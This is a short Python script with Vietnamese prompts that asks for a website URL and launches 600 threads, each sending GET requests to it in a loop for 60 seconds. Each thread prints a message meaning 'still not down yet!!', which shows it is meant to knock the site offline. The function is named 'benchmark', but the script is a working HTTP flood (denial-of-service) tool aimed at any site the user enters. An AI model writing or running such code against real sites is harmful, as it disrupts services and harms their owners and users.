import threading
import requests
import time

site = input("Nhập vào website : ")
timeout = 60
timeout_start = time.time()
def benchmark():
    while time.time() < timeout_start + timeout:
        a = requests.get(site)
        print("Mãi Vẫn Chưa Sập !!")

for i in range(600):
            a = 'a_{}'.format(i)
            a = threading.Thread(target=benchmark)
            a.start()
